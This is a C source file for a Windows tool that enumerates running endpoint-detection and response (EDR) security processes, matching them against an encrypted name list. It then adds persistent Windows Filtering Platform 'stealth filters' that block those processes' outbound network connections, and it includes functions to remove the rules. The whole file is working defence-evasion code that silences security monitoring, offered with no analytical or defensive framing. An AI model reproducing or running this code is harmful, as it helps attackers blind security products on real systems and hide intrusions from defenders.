#include "core.h"

// Globally unique identifiers (GUIDs) remain here
const GUID ProviderGUID = { 0x4e27e7d4, 0x2442, 0x4891, { 0x91, 0x2e, 0x42, 0x5, 0x42, 0x8a, 0x85, 0x55 } };
const GUID SubLayerGUID = { 0x4e27e7d5, 0x2442, 0x4891, { 0x91, 0x2e, 0x42, 0x5, 0x42, 0x8a, 0x85, 0x55 } };

// Forward declarations for internal helper functions
static void applyStealthFilters(HANDLE hEngine, const GUID* subLayerGuid, PCWSTR fullPath);
static BOOL initializeWfp(HANDLE* hEngine);
static void shutdownWfp(HANDLE hEngine);

UINT64 CustomStrToULL(const char* str, char** endptr) {
    UINT64 result = 0;
    const char* p = str;

    while (*p == ' ' || *p == '\t') {
        p++;
    }

    while (*p >= '0' && *p <= '9') {
        result = result * 10 + (*p - '0');
        p++;
    }

    if (endptr) {
        *endptr = (char*)p;
    }
    return result;
}

static void applyStealthFilters(HANDLE hEngine, const GUID* subLayerGuid, PCWSTR fullPath) {
    FWP_BYTE_BLOB* appId = NULL;
    DWORD result = 0;
    UINT64 filterId = 0;

    if (CustomFwpmGetAppIdFromFileName0(fullPath, &appId) != CUSTOM_SUCCESS) {
        EWPRINTF(L"    [-] Failed to get AppID for %s\n", fullPath);
        return;
    }

    FWPM_FILTER0 blockFilter = {0};
    blockFilter.subLayerKey = *subLayerGuid;
    blockFilter.action.type = FWP_ACTION_BLOCK;
    blockFilter.weight.type = FWP_UINT8;
    blockFilter.weight.uint8 = 15;
    blockFilter.numFilterConditions = 1;
    blockFilter.displayData.name = EDR_FILTER_NAME;
    blockFilter.displayData.description = EDR_FILTER_DESCRIPTION;

    blockFilter.providerKey = (GUID*)&ProviderGUID; // Associate the filter with your provider
    blockFilter.flags = FWPM_FILTER_FLAG_PERSISTENT;   // Make the filter persistent

    FWPM_FILTER_CONDITION0 blockCondition = {0};
    blockCondition.fieldKey = FWPM_CONDITION_ALE_APP_ID;
    blockCondition.matchType = FWP_MATCH_EQUAL;
    blockCondition.conditionValue.type = FWP_BYTE_BLOB_TYPE;
    blockCondition.conditionValue.byteBlob = appId;
    blockFilter.filterCondition = &blockCondition;

    blockFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
    result = FwpmFilterAdd0(hEngine, &blockFilter, NULL, &filterId);
    if (result != ERROR_SUCCESS) {
        EWPRINTF(L"    [-] Failed to add IPv4 block filter for %s. Error: 0x%lX\n", fullPath, result);
    } else {
        WPRINTF(L"    [+] Block filter added for %s (ID: %llu, IPv4).\n", fullPath, filterId);
    }

    blockFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
    filterId = 0;
    result = FwpmFilterAdd0(hEngine, &blockFilter, NULL, &filterId);
    if (result != ERROR_SUCCESS) {
        EWPRINTF(L"    [-] Failed to add IPv6 block filter for %s. Error: 0x%lX\n", fullPath, result);
    } else {
        WPRINTF(L"    [+] Block filter added for %s (ID: %llu, IPv6).\n", fullPath, filterId);
    }

    FreeAppId(appId);
}

static BOOL initializeWfp(HANDLE* hEngine) {
    DWORD result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, hEngine);
    if (result != ERROR_SUCCESS) {
        EPRINTF("[-] FwpmEngineOpen0 failed. Error: 0x%lX\n", result);
        return FALSE;
    }

    FWPM_PROVIDER0 provider = { 0 };
    provider.providerKey = ProviderGUID;
    provider.displayData.name = EDR_PROVIDER_NAME;
    provider.displayData.description = EDR_PROVIDER_DESCRIPTION;
    result = FwpmProviderAdd0(*hEngine, &provider, NULL);
    if (result != ERROR_SUCCESS && (long)result != FWP_E_ALREADY_EXISTS) {
        EPRINTF("[-] FwpmProviderAdd0 failed. Error: 0x%lX\n", result);
        FwpmEngineClose0(*hEngine);
        return FALSE;
    }

    FWPM_SUBLAYER0 subLayer = { 0 };
    subLayer.subLayerKey = SubLayerGUID;
    subLayer.displayData.name = EDR_SUBLAYER_NAME;
    subLayer.displayData.description = EDR_SUBLAYER_DESCRIPTION;
    subLayer.providerKey = (GUID*)&ProviderGUID;
    subLayer.weight = 0x01;
    result = FwpmSubLayerAdd0(*hEngine, &subLayer, NULL);
    if (result != ERROR_SUCCESS && (long)result != FWP_E_ALREADY_EXISTS) {
        EPRINTF("[-] FwpmSubLayerAdd0 failed. Error: 0x%lX\n", result);
        FwpmEngineClose0(*hEngine);
        return FALSE;
    }

    return TRUE;
}

static void shutdownWfp(HANDLE hEngine) {
    if (hEngine) {
        FwpmEngineClose0(hEngine);
        PRINTF("[+] WFP engine handle closed.\n");
    }
}

void addProcessRule(const char* processPath) {
    if (!EnableSeDebugPrivilege()) {
        EPRINTF("[-] Failed to enable SeDebugPrivilege. This is required to add a process rule.\n");
        return;
    }
    HANDLE hEngine = NULL;
    if (!initializeWfp(&hEngine)) {
        return;
    }

    wchar_t processPathW[MAX_PATH];
    if (MultiByteToWideChar(CP_ACP, 0, processPath, -1, processPathW, MAX_PATH) == 0) {
        EPRINTF("[-] Failed to convert process path or path is too long.\n");
        shutdownWfp(hEngine);
        return;
    }

    applyStealthFilters(hEngine, &SubLayerGUID, processPathW);

    shutdownWfp(hEngine);
}

void configureNetworkFilters() {
    if (!EnableSeDebugPrivilege()) {
        EPRINTF("[-] Failed to enable SeDebugPrivilege. This is required to access process information.\n");
        return;
    }
    HANDLE hEngine = NULL;
    if (!initializeWfp(&hEngine)) {
        return;
    }

    WCHAR processedPaths[100][MAX_PATH] = {0};
    int processedCount = 0;

    char** decryptedNames = (char**)HeapAlloc(g_hHeap, HEAP_ZERO_MEMORY, PROCESS_DATA_COUNT * sizeof(char*));
    if (!decryptedNames) {
        EPRINTF("Memory allocation failed for decrypted names list.\n");
        shutdownWfp(hEngine);
        return;
    }

    for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
        decryptedNames[i] = decryptString(processData[i]);
    }

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        EPRINTF("[-] Failed to create snapshot of processes.\n");
        for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
            if (decryptedNames[i]) HeapFree(g_hHeap, 0, decryptedNames[i]);
        }
        HeapFree(g_hHeap, 0, decryptedNames);
        shutdownWfp(hEngine);
        return;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe32)) {
        do {
            for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
                if (decryptedNames[i] && lstrcmpiA(pe32.szExeFile, decryptedNames[i]) == 0) {
                    PRINTF("[+] Found EDR process: %s\n", pe32.szExeFile);
                    WCHAR fullPath[MAX_PATH];
                    if (getProcessFullPath(pe32.th32ProcessID, fullPath, MAX_PATH)) {
                        WPRINTF(L"[DEBUG] Full Path for %hs: %s\n", pe32.szExeFile, fullPath);
                        BOOL alreadyProcessed = FALSE;
                        for (int j = 0; j < processedCount; ++j) {
                            if (lstrcmpiW(processedPaths[j], fullPath) == 0) {
                                alreadyProcessed = TRUE;
                                break;
                            }
                        }

                        if (!alreadyProcessed) {
                            applyStealthFilters(hEngine, &SubLayerGUID, fullPath);
                            if (processedCount < 100) {
                                lstrcpyW(processedPaths[processedCount], fullPath);
                                processedCount++;
                            } else {
                                EWPRINTF(L"    [!] Warning: Processed path limit reached. May not block all subsequent finds.\n");
                            }
                        } else {
                            WPRINTF(L"    [!] Skipping already blocked process path: %s\n", fullPath);
                        }
                    } else {
                        EPRINTF("    [-] Could not get full path for process: %s\n", pe32.szExeFile);
                    }
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
        if (decryptedNames[i]) HeapFree(g_hHeap, 0, decryptedNames[i]);
    }
    HeapFree(g_hHeap, 0, decryptedNames);

    CloseHandle(hSnapshot);
    shutdownWfp(hEngine);
}

void removeAllRules() {
    if (!EnableSeDebugPrivilege()) {
        EPRINTF("[-] Failed to enable SeDebugPrivilege. This is required to remove rules.\n");
        return;
    }
    HANDLE hEngine = NULL;
    DWORD result = 0;

    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        EPRINTF("[-] FwpmEngineOpen0 failed. Error: 0x%lX\n", result);
        return;
    }

    result = FwpmSubLayerDeleteByKey0(hEngine, &SubLayerGUID);
    if (result == ERROR_SUCCESS) {
        PRINTF("[+] Sublayer and all associated filters removed successfully.\n");
    } else if ((long)result == FWP_E_SUBLAYER_NOT_FOUND) {
        EPRINTF("[-] Sublayer not found. No rules to remove.\n");
    } else {
        EPRINTF("[-] FwpmSubLayerDeleteByKey0 failed. Error: 0x%lX\n", result);
    }

    result = FwpmProviderDeleteByKey0(hEngine, &ProviderGUID);
    if (result == ERROR_SUCCESS) {
        PRINTF("[+] Provider removed successfully.\n");
    } else if ((long)result == FWP_E_PROVIDER_NOT_FOUND) {
        EPRINTF("[-] Provider not found.\n");
    } else {
        EPRINTF("[-] FwpmProviderDeleteByKey0 failed. Error: 0x%lX\n", result);
    }

    FwpmEngineClose0(hEngine);
}

void removeRuleById(UINT64 ruleId) {
    HANDLE hEngine = NULL;
    DWORD result = 0;

    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        EPRINTF("[-] FwpmEngineOpen0 failed. Error: 0x%lX\n", result);
        return;
    }

    result = FwpmFilterDeleteById0(hEngine, ruleId);
    if (result == ERROR_SUCCESS) {
        PRINTF("[+] Rule with ID %llu removed successfully.\n", ruleId);
    } else if ((long)result == FWP_E_FILTER_NOT_FOUND) {
        EPRINTF("[-] Rule with ID %llu not found.\n", ruleId);
    } else {
        EPRINTF("[-] Failed to remove rule with ID %llu. Error: 0x%lX\n", ruleId, result);
    }

    FwpmEngineClose0(hEngine);
}
